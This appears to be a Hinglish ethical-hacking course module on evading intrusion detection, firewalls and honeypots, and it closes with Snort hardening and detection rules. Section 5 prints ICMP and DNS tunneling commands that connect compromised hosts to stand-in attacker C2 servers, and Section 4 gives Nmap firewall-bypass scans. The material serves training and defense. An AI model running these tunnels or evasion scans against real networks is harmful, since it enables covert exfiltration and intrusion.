# **Module 12: Evading IDS, Firewalls, and Honeypots**

### **Advanced Network Evasion, Packet Manipulation & Wire-Level Defense Engineering**

---

## **Master Architecture & Evasion Blueprint**

+-------------------------------------------------------------------------------------------------------------------------+

|                                    MODULE 12: EVADING IDS, FIREWALLS & HONEYPOTS                                        |

+-------------------------------------------------------------------------------------------------------------------------+

|  [01] Architectural Foundations    --> NIDS vs HIDS, Detection Logic (Signature/Anomaly), Firewall Topology, Honeypots  |

|  [02] Snort Engine & Preprocessors --> Rule Syntax (Headers/Options), Frag3 Target-Based Defrag, Stream5, sfPortscan     |

|  [03] Wire-Level IDS Evasion       --> Ptacek & Newsham (Insertion vs Evasion), Fragment Reassembly Policies, TTL Tricks|

|  [04] Firewall Evasion & Bypasses  --> Tiny Fragments (-f, --mtu), Decoys (-D), Source Port Spoofing (-g 53), Badsum    |

|  [05] Deep Tunneling Vectors       --> ICMP Data Tunneling, DNS Subdomain Encapsulation, SSH Dynamic SOCKS, BITSAdmin   |

|  [06] NAC, VLAN & EDR Bypasses     --> 802.1Q Double Tagging, DTP Switch Spoofing, EDR NTDLL Memory Unhooking (Syscalls)|

|  [07] Honeypot Fingerprinting      --> TCP Window Size 0 Anomalies, Black Hole MACs, UML/Sebek Syscall Latency Leaks    |

|  [08] Enterprise Hardening Matrix  --> Traffic Normalization (Frag3/Normalizer), Strict Egress Filtering, Snort IDS Rules |

+-------------------------------------------------------------------------------------------------------------------------+

---

## **1. Architectural Foundations: IDS, IPS, Firewalls & Honeypots**

Enterprise perimeter security multiple defensive layers par rely karti hai:

[ Untrusted Internet ]

          │

          ▼

   [ External IDS ] ──────────▶ (Passive Sniffer: Monitors raw ingress traffic before firewall)

          │

          ▼

   [ Perimeter Firewall ] ────▶ (Stateful / NGFW: Enforces L3-L7 Access Control Lists)

          │

     ┌────┴───────────────────────────┐

     ▼                                ▼

[ DMZ: Bastion Hosts / Proxies ]  [ Internal Inline IPS ] ──▶ (Active: Drops packets in real-time)

                                      │

                                      ▼

                             [ Internal Corporate LAN ]

                             (Monitored by Decoy Honeypots & HIDS Agents)

### **1.1 Detection Engines & Alert Probability Matrix**

1. **Signature-Based (Pattern Matching):** Known attack bytes (e.g., specific exploit shellcode ya CVE byte sequences) se match karta hai. Fast hai lekin zero-days aur polymorphic malware par fail ho jata hai.
2. **Anomaly-Based (Behavioral Baseline):** Normal network metrics (bandwidth, packet rates, port connections) ka baseline profile banata hai. Statistical deviation (e.g., CUSUM algorithm) detect hone par alert trigger karta hai.
3. **Protocol Anomaly:** RFC standards (RFC 791 IPv4, RFC 793 TCP) ke violation ko inspect karta hai (e.g., illegal TCP flag combinations like SYN-FIN ya oversized header options).

#### **The Alert Classification Matrix (CEH Core):**

                       Actual Traffic State

                     Attack             No Attack

                 +-------------------+-------------------+

          Alert  |   True Positive   |  False Positive   |

                 |       (✅✅)      |       (❌✅)      |  <-- Alert Fatigue!

IDS Status       +-------------------+-------------------+

        No Alert |  False Negative   |   True Negative   |

                 |       (✅❌)      |       (❌❌)      |  <-- CATASTROPHIC! (Attack Succeeded Unseen)

                 +-------------------+-------------------+

### **1.2 Firewall Classification & Topologies**

- **Packet-Filtering (Stateless - L3):** Sirf IP header (Source IP, Dest IP) aur L4 ports check karta hai. Packets ke connection state ka koi record nahi rakhta.
- **Circuit-Level Gateway (L5 - Session):** TCP 3-way handshake verify karta hai bina packet payload inspect kiye (e.g., SOCKS proxy).
- **Application-Level Gateway (Proxy - L7):** Application commands (HTTP `GET`/`POST`, FTP `PORT`) ko deeply analyze karta hai.
- **Stateful Multilayer Inspection (Stateful - L3-L7):** Connection State Table maintain karta hai. Agar outgoing TCP SYN gaya tha, to returning SYN-ACK automatically allow ho jata hai.
- **Network Topologies:**
    - **Bastion Host:** Fully exposed, hardened host jo directly internet se communicate karta hai.
    - **Screened Subnet / DMZ:** Two firewalls (ya multi-homed firewall) ke beech ka isolated network segment jisme public-facing servers (Web, Mail, DNS) host hote hain.

### **1.3 Honeypots & Honeyfarms**

- **Low-Interaction (e.g., KFSensor, HoneyBOT):** Sirf basic network ports aur banners simulate karta hai (e.g., port 21 par standard FTP string). Minimal risk; attacker ko OS level access nahi milta.
- **High-Interaction:** Real operating system aur applications run karta hai. Attacker ko complete sandbox control milta hai taaki full 0-day exploitation chain analyze ki ja sake.
- **Honeynet & Honeyfarm:** Multiple honeypots ka centralized decoy network jo enterprise production LAN ke beech traps ki tarah distribute hota hai.

---

## **2. Snort Engine Architecture & Preprocessor Internals**

Snort industry-standard open-source Network Intrusion Detection/Prevention System (NIDS/IPS) hai.

       [ Raw Network Frame ] ──▶ [ Packet Decoder ] ──▶ [ Preprocessors (Frag3, Stream5) ]

                                                                   │

                                                                   ▼

       [ Log / Alert Output ] ◀── [ Detection Engine (Rules) ] ◀───┘

### **2.1 Snort Rule Anatomy & Header Syntax**

snort

alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:"ET EXPLOIT ProFTPD Buffer Overflow Attempt"; flow:to_server,established; content:"USER "; depth:5; nocase; pcre:"/USER\x20[^\n]{500}/"; classtype:attempted-admin; sid:2001050; rev:2;)

- **Rule Header:**
    - `alert`: Action (`alert`, `log`, `drop`, `reject`, `pass`).
    - `tcp`: Protocol (`tcp`, `udp`, `icmp`, `ip`).
    - `$EXTERNAL_NET any -> $HOME_NET 21`: Source IP/Port to Destination IP/Port.
- **Rule Options:**
    - `flow:to_server,established`: Sirf completed 3-way handshake sessions par evaluate karega.
    - `content:"USER "; depth:5; nocase`: Payload ke pehle 5 bytes me case-insensitive search.
    - `pcre:"/..."`: Regular expression matching (500+ character long username buffer).
    - `sid:2001050`: Snort Rule ID (Local/Custom rules start from `> 1000000`).

---

## **3. Wire-Level IDS Evasion Mechanics: The Ptacek & Newsham Duality**

1998 me Thomas Ptacek aur Timothy Newsham ne seminal research publish ki thi: **"Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection"**. IDS evasion ka fundamental principle ye hai ki **Network IDS aur End-Host Target operating system raw TCP/IP packets ko alag-alag tarike se interpret aur reassemble karte hain.**

                                  +───────────────────────────────────+

                                  |   PTACEK & NEWSHAM EVASION CORE   |

                                  +───────────────────────────────────+

                                                    │

             ┌──────────────────────────────────────┴──────────────────────────────────────┐

             ▼                                                                             ▼

   [ INSERTION ATTACK ]                                                          [ EVASION ATTACK ]

   - IDS accepts packet; Target DROPS it!                                        - IDS drops/ignores packet; Target ACCEPTS it!

   - Result: IDS detects a dummy harmless string.                                - Result: IDS misses the attack; Target executes

   - Target reassembles the real malicious exploit!                              - the hidden malicious payload!

### **3.1 Target-Based Fragment Reassembly Policies (Frag3 Matrix)**

Jab ek attacker IP datagram ko overlapping fragments me split karta hai, to har operating system overlapping data ko alag policy ke sath merge karta hai:

Fragment 1: Offset = 0, Length = 16  ──▶ Payload: "GET /index.html?"

Fragment 2: Offset = 8, Length = 16  ──▶ Payload: "evil_exploit.php" (Overlaps at byte 8!)

|OS Platform|Frag3 Policy Type|Reassembly Behavior (Overlapping Portion)|Evasion Weaponization Mechanics|
|---|---|---|---|
|**Windows / Cisco / MacOS**|**`First`**|**Retains the FIRST fragment received.** Subsequent overlapping data discard ho jata hai.|Attacker malicious payload first packet me bhejta hai, harmless data second packet me.|
|**Old Linux / Cisco IOS**|**`Last`**|**Overwrites with the LAST fragment received.** Older data get replaced.|Harmless data first packet me bhejte hain, malicious payload second overlapping fragment me.|
|**Modern Linux (2.4+)**|**`Linux`**|Prefers newer data for overlapping offsets, but retains older non-overlapping bytes.|Complex byte offset shifting.|
|**BSD (FreeBSD, OpenBSD)**|**`BSD`**|Strictly retains original data without offset alteration.|Exact byte boundaries preserved.|

> **Snort Frag3 Defense:** Target-based modeling me Snort ko network architecture pehle se pata hoti hai (`policy windows bind_to 192.168.1.50`, `policy linux bind_to 192.168.1.100`). Snort packets ko us target OS ke rule ke hisab se hi reassemble karta hai!

---

### **3.2 Time-to-Live (TTL) Evasion Mechanics**

Attacker apne packets ka IPv4 Header field **TTL (Time-to-Live)** carefully calculate karta hai:

Attacker ──────── (Router 1) ──────── [ IDS Sensor ] ──────── (Router 2) ──────── Target Host

 [TTL=15]            [TTL=14]              [TTL=13]              [TTL=12]           [TTL=11]

Scenario A (Insertion Attack via Low TTL):

1. Attacker sends a dummy packet with TTL = 1 (Dies at Router 1, before IDS).

2. Attacker sends dummy byte 'X' with TTL = 3 (Reaches IDS, but dies before Target Host!).

3. IDS reassembles: "G E T X / p w n" -> Harmless string, no alert.

4. Target Host receives only valid packets: "G E T / p w n" -> EXPLOITED!

### **3.3 Session Splicing & Tiny Fragments**

Signature matching engine packet buffers ke andar continuous strings khojta hai (e.g., `root`, `/bin/sh`).

- **Session Splicing:** Attack payload ko multiple chhote TCP segments me divide kar dena (e.g., 1 byte per packet).
- Agar IDS session reassembly buffer chota hai ya packet stream ko jaldi flush kar deta hai, to signature match fail ho jata hai.

---

## **4. Firewall Evasion & Packet Manipulation Engine (Nmap Mastery)**

Firewalls incoming traffic ko filter karne ke liye strict access control rules follow karte hain. Nmap advanced packet construction flags provide karta hai jo misconfigured firewalls aur perimeter filters ko bypass karte hain.

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

| Nmap Parameter / Flag     | Technical Mechanism & Firewall Bypass Impact                                    |

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

| `-f`                      | IP packet ko tiny 8-byte fragments me split karta hai (splits TCP header).      |

| `-f -f` ya `--mtu 16/32`  | Fragments ko 16 ya 32 bytes MTU boundary par enforce karta hai.                 |

| `-D RND:10,ME`            | 10 random spoofed decoy IPs inject karta hai; real IP detect karna impossible.   |

| `-g 53` / `--source-port` | Outgoing traffic ka source port 53 (DNS) ya 88 (Kerberos) spoof karta hai.       |

| `--data-length 50`        | TCP packets me random payload append karta hai taaki packet length normal lage. |

| `--badsum`                | Invalid TCP/UDP checksum generate karta hai. Target OS drops it, Firewall leaks!|

| `-sS -T1` (Paranoid)      | Scan interval ko slow karta hai taaki threshold-based IDS alerts trigger na hon.|

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

### **4.1 Exploiting Insecure Firewall Rules via Source Port Spoofing (`-g`)**

Purane aur misconfigured firewalls me administrators incoming DNS replies ya FTP data allow karne ke liye source port par check laga dete hain:

- `Allow Inbound UDP if Source Port == 53`
- `Allow Inbound TCP if Source Port == 88 (Kerberos)`

bash

# Bypass firewall by sending SYN packets originating from Source Port 53 (DNS)

sudo nmap -sS -Pn -g 53 -p 80,443,8080 192.168.1.100

# Tiny Fragment Scan (Splits 20-byte TCP header across multiple fragments)

sudo nmap -sS -Pn -f --mtu 32 --send-eth -p 21,22,80 192.168.1.100

# Probe Firewall filtering via Bogus Checksum (--badsum)

# Legitimate OS network stacks verify checksum and DROP packet.

# If a RST or SYN-ACK returns, it came from a poorly configured stateful firewall/proxy!

sudo nmap -sS -Pn --badsum -p 80 192.168.1.100

### **4.2 Firewalking: Determining Gateway ACL Rules**

**Firewalking** ek reconnaissance technique hai jo traceroute aur TTL manipulation use karke firewall ke peeche kaun se ports open hain ye identify karti hai:

Attacker ──────▶ [ Gateway Firewall ] ──────▶ [ Target Host behind Firewall ]

                (Hop count = 2)              (Hop count = 3)

1. Attacker firewall ka distance determine karta hai (e.g., 2 hops).
2. Packet craft kiya jata hai with `TTL = 3` targeted at port 80.
3. Agar port 80 firewall par **ALLOWED** hai: Packet firewall cross karega, hop 3 par target host tak pahunchega, aur TTL expire hone par `ICMP Time Exceeded (Type 11, Code 0)` return hoga.
4. Agar port 80 **BLOCKED** hai: Firewall packet ko silently drop kar dega ya `ICMP Administratively Prohibited (Type 3, Code 13)` return karega.

bash

# Firewalking audit syntax

firewalk -S 21-25 -T 80 -n 192.168.1.1 192.168.1.50

---

## **5. Traffic Tunneling Mastery: Evading Perimeter Egress Filtering**

Jab outbound traffic restricted hota hai (e.g., only HTTP/DNS allowed), attackers allowed protocols ke andar unauthorized data encapsulate kar dete hain.

                         +─────────────────────────────────────────+

                         |        DATA TUNNELING TECHNIQUES        |

                         +─────────────────────────────────────────+

                                              │

            ┌─────────────────────────────────┼─────────────────────────────────┐

            ▼                                 ▼                                 ▼

   [ ICMP Tunneling ]                [ DNS Tunneling ]                 [ SSH Dynamic SOCKS ]

   - RFC 792 Echo Data Payload       - Base32 Subdomain Encapsulation  - Port 443 Encrypted Tunnel

   - Tools: ptunnel, icmpsh          - Tools: dnscat2, iodine          - Tools: OpenSSH, Bitvise

### **5.1 ICMP Tunneling (RFC 792 Payload Abuse)**

RFC 792 ICMP Echo Request (`Type 8`) aur Reply (`Type 0`) ke data payload ko restrict nahi karta. Standard ping packets me arbitrary binary data transfer kiya ja sakta hai:

bash

# Attacker C2 Server (Listener)

sudo ptunnel -x secret_auth_token

# Compromised Client behind Strict Firewall (Forwards Local Port 2222 over ICMP to Attacker)

ptunnel -p attacker.corp.com -lp 2222 -da 127.0.0.1 -dp 22 -x secret_auth_token

# Connect via local forwarded port

ssh root@127.0.0.1 -p 2222

### **5.2 DNS Data Exfiltration & Tunneling (`dnscat2`)**

Enterprise firewalls internal hosts ko direct internet access block karte hain lekin **Internal DNS Resolvers** ko public queries resolve karne dete hain. DNS tunneling client data ko subdomains me encode karta hai:

[ Compromised Host ] ──▶ [ Internal Corporate DNS ] ──▶ [ Authoritative Nameserver (Attacker C2) ]

 Query: a7b8c9d0.tunnel.attacker-domain.com ────────────▶ Decodes Base32 string to shellcode!

 Reply: TXT record contains C2 execution commands! ◀──── Encoded Command Output

bash

# Launch dnscat2 C2 server on authoritative DNS server

sudo ruby dnscat2.rb --dns domain=tunnel.attacker-domain.com,port=53

# On target client behind strict firewall:

./dnscat --dns domain=tunnel.attacker-domain.com

### **5.3 SSH Dynamic SOCKS Port Forwarding**

bash

# Create local encrypted SOCKS5 proxy over allowed outbound port 443

ssh -D 1080 -p 443 -N -f user@external-proxy.com

# Configure proxychains (/etc/proxychains.conf -> socks5 127.0.0.1 1080)

proxychains nmap -sT -Pn 10.10.10.0/24

---

## **6. NAC, VLAN & Endpoint Security Bypass**

### **6.1 VLAN Hopping: Switch Spoofing & Double Tagging**

Network Access Control (NAC) aur switch VLAN segmentation ko bypass karne ke 2 methods:

[ 1. Switch Spoofing (DTP Attack) ]

Attacker machine Dynamic Trunking Protocol (DTP) packets inject karti hai,

switch port ko "Trunk Mode" negotiate karne par force karti hai!

Attacker sabhi VLANs (VLAN 10, 20, 30) ka traffic sniff aur access kar sakta hai.

Tool: yersinia dtp -attack 1

[ 2. Double Tagging (802.1Q Nested Headers) ]

Attacker frame me DO VLAN tags bind karta hai:

[ Outer Tag: VLAN 1 (Native) ] + [ Inner Tag: VLAN 20 (Target Victim) ]

Switch 1 outer tag strip karta hai aur packet native VLAN par forward karta hai.

Switch 2 inner tag dekhta hai aur frame ko seedha Victim VLAN 20 me drop kar deta hai!

(Note: One-way communication / unidirectional).

### **6.2 EDR Memory Unhooking (Direct System Calls)**

Modern Endpoint Detection and Response (EDR) solutions (CrowdStrike, Defender for Endpoint) user-space APIs par hook lagate hain (`ntdll.dll` functions like `NtCreateFile`, `NtAllocateVirtualMemory` me `jmp <EDR_Sensor>` inject karte hain).

Standard Call Flow (HOOKED):

Application ──▶ ntdll.dll!NtAllocateVirtualMemory ──▶ [ JMP EDR Sensor ] ──▶ Kernel (Syscall)

                                                               │

                                                       (EDR BLOCKS SHELLCODE!)

Direct Syscall / Memory Unhooking Flow (BYPASS):

Application ──▶ Manually reads Syscall SSN (System Service Number) from disk

            ──▶ Issues raw ASM instruction: "syscall" directly to Kernel!

            ──▶ Bypasses userland memory hooks completely!

---

## **7. Honeypot Detection & Fingerprinting Mechanics**

Red teams aur advanced penetration testers target system se interact karne se pehle verify karte hain ki wo real enterprise server hai ya fake decoy trap (Honeypot).

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

| Fingerprinting Vector     | Technical Diagnostic Signature & Behavioral Flaw                                |

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

| **TCP Window Size 0**     | Honeyd flaw: Inbound packets ko continuously ACK karta hai even jab TCP Window  |

|                           | Size explicitly `0` set kiya gaya ho (Standard hosts traffic hold karte hain). |

| **Black Hole MAC Pattern**| Honeypot virtual bridges often return default synthetic MACs: `00:00:0F:FF:FF:FF`|

| **Syscall Latency Shifts**| Sebek-based honeypots kernel me `read()` aur `write()` syscalls hook karte hain,|

|                           | logging overhead ki wajah se unnatural microsecond delay induce hota hai.       |

| **UML / Container Leaks** | Decoy VM file systems me artifacts leak hote hain: `/proc/mounts`,              |

|                           | `/proc/cmdline`, ya known hypervisor MAC vendor OUIs (VMware, VirtualBox).      |

+───────────────────────────+─────────────────────────────────────────────────────────────────────────────────+

### **7.1 Automated Honeypot Detection Script (Python Scapy)**

python

#!/usr/bin/env python3

"""

Diagnostic Honeypot TCP Window Verification Probe

Tests if target acknowledges data packets when Window Size is advertised as 0.

"""

from scapy.all import IP, TCP, sr1

import sys

TARGET_IP = "192.168.1.75"

def probe_honeypot():

    # Send SYN packet with Window Size = 0

    syn_pkt = IP(dst=TARGET_IP)/TCP(dport=80, flags="S", window=0)

    syn_ack = sr1(syn_pkt, timeout=2, verbose=0)

    if syn_ack and syn_ack.haslayer(TCP):

        if syn_ack[TCP].flags == "SA":

            print(f"[+] Received SYN-ACK from {TARGET_IP} with Window: {syn_ack[TCP].window}")

            # If server accepts data on window 0, suspicious Honeypot behavior!

            ack_pkt = IP(dst=TARGET_IP)/TCP(dport=80, flags="A", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, window=0)

            data_pkt = IP(dst=TARGET_IP)/TCP(dport=80, flags="PA", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, window=0)/"TEST_PROBE"

            reply = sr1(data_pkt, timeout=2, verbose=0)

            if reply:

                print("[!] ALERT: Target acknowledged data despite Window Size 0! High probability of Honeypot (Honeyd).")

            else:

                print("[*] Normal stack response: Host respected 0 window size.")

if __name__ == "__main__":

    probe_honeypot()

---

## **8. Enterprise Defense-in-Depth & Hardening Countermeasures**

                                  +──────────────────────────────────+

                                  |    DEFENSE-IN-DEPTH HARDENING    |

                                  +──────────────────────────────────+

                                                    │

             ┌──────────────────────────────────────┼──────────────────────────────────────┐

             ▼                                      ▼                                      ▼

   [ Traffic Normalization ]               [ Firewall Hardening ]                 [ Active Session Control ]

   - Snort Frag3 Engine Enabled           - Strict Default-Deny Policies          - TCP RST / FIN Injection

   - Normalizes overlapping fragments     - Deep Inspection on Port 53/80         - Shuts down anomalous sessions

   - Aligns with Host OS Policies         - Blocks Outbound Unauthorized Tunnels  - Closes embryonic connections

### **8.1 Snort Target-Based Defragmentation Hardening (`snort.conf`)**

Snort ko Ptacek & Newsham insertion aur evasion attacks se bachane ke liye **Frag3 Preprocessor** target-based configuration:

snort

# /etc/snort/snort.conf - Frag3 Anti-Evasion Hardening

# 1. Global Memory Configuration

preprocessor frag3_global: max_frags 65536, memcap 33554432, prealloc_frags 8192

# 2. Target-Based Engine Binding

# Bind Windows servers to 'windows' reassembly policy (First-fragment preference)

preprocessor frag3_engine: policy windows bind_to [192.168.1.10,192.168.1.11] detect_anomalies overlap_limit 5 min_fragment_length 100

# Bind Linux Web Servers to 'linux' policy

preprocessor frag3_engine: policy linux bind_to 192.168.1.50 detect_anomalies overlap_limit 5

# Fallback default engine for rest of network

preprocessor frag3_engine: policy bsd detect_anomalies

### **8.2 Production Detection Signatures (Snort Rules)**

snort

# 1. Detect Fragment Overlap Anomalies (Potential IDS Evasion Probe)

alert ip any any -> $HOME_NET any (msg:"EVASION-ATTACK Overlapping IP Fragments Detected"; fragbits:M; fragoffset:>0; classtype:bad-unknown; sid:4001001; rev:1;)

# 2. Detect ICMP Tunneling Activity (Excessive Data Payload in Echo Request > 64 bytes)

alert icmp any any -> $HOME_NET any (msg:"EVASION-ATTACK Anomalous ICMP Echo Request Large Payload (Tunneling)"; itype:8; dsize:>100; classtype:suspicious-traffic; sid:4001002; rev:1;)

# 3. Detect DNS Tunneling Patterns (High entropy or subdomains > 45 characters)

alert udp any any -> $HOME_NET 53 (msg:"EVASION-ATTACK Potential DNS Tunneling Long Subdomain Query"; content:"|00 01 00 01|"; isdataat:50,relative; classtype:bad-unknown; sid:4001003; rev:1;)

---

## **20-Module Masterclass Progress Tracker**

|Module #|Module Title / Subject|Status|
|---|---|---|
|**01**|Introduction to Ethical Hacking & Web Fundamentals|**Completed**|
|**02**|Footprinting & Reconnaissance|**Completed**|
|**03**|Scanning Networks|**Completed**|
|**04**|Enumeration (SMB, LDAP, SNMP, RPC)|**Completed**|
|**05**|Vulnerability Analysis|**Completed**|
|**06**|System Hacking & AD Exploitation|**Completed**|
|**07**|Malware Threats & Dynamic Analysis|**Completed**|
|**08**|Sniffing & Deep Wire Forensics|**Completed**|
|**09**|Social Engineering & Phishing Infrastructure|**Completed**|
|**10**|Denial-of-Service (DoS / DDoS)|**Completed**|
|**11**|Session Hijacking & Token Manipulation|**Completed**|
|**12**|**Evading IDS, Firewalls, and Honeypots**|**COMPLETED**|
|**13**|Hacking Web Servers|⏳ _Next in Queue_|
|**14**|Hacking Web Applications|⏳ _Pending_|
|**15**|SQL Injection|⏳ _Pending_|
|**16**|Hacking Wireless Networks|⏳ _Pending_|
|**17**|Hacking Mobile Platforms|⏳ _Pending_|
|**18**|IoT & OT Hacking|⏳ _Pending_|
|**19**|Cloud Computing Security|⏳ _Pending_|
|**20**|Cryptography & PKI|⏳ _Pending_|